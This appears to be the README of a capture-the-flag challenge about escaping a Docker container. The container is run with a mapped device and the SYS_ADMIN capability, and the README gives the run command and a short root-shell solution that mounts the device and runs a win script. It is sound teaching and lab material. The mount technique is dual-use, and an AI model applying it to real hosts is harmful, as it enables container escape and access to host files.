# Dangerous device mount

Docker has built-in flag _--device_ which allows devices to be run inside a container. This way, _--privileged_ flag does not need to be used. When combined with _SYS_ADMIN_ capability, device can be also mounted, and therefore interaction between another file system takes place. Mounting a device itself is not dangerous if the device is for example a pendrive or external hard drive, but mounting internal drive which is used by host system can help attackers to escape from a container.

## Description

Prepared device is a virtual disk in `.iso` format, which is mounted as a loop device. In real environment, it could be /dev/sda when whole system areagit would be accessible. Due to the fact of how the platform is constructed, many different possibilities for disk creation could not be used. Additional information can be found in `create_disk.sh` file.

Docker is run with following command:
```
docker run --device={loop}:/dev/s3cur3 --cap-add='SYS_ADMIN' -p {port}:8081 -d --restart unless-stopped vuln
```
where {loop} is a /dev/loopX device which will be mounted as /dev/s3cur3.

Docker run with this command has this device available in its /dev. Additionally, SYS_ADMIN capability allows to use `mount` command.

## Solution

```
root@c9a6d5d0c7b7:/# ls /dev
core  fd  full  mqueue  null  ptmx  pts  random  s3cur3  shm  stderr  stdin  stdout  tty  urandom  zero
root@c9a6d5d0c7b7:/# mkdir /mnt/drive
root@c9a6d5d0c7b7:/# mount /dev/s3cur3 /mnt/drive
root@c9a6d5d0c7b7:/# cd /mnt/drive
root@c9a6d5d0c7b7:/mnt/drive# ls
RUN_ME_TO_WIN.sh  lost+found
root@c9a6d5d0c7b7:/mnt/drive# ./RUN_ME_TO_WIN.sh
root@c9a6d5d0c7b7:/mnt/drive# ls
RUN_ME_TO_WIN.sh  VICTORY  lost+found
root@c9a6d5d0c7b7:/mnt/drive# 
```

## Challenge author
[linoskoczek](https://github.com/linoskoczek/)
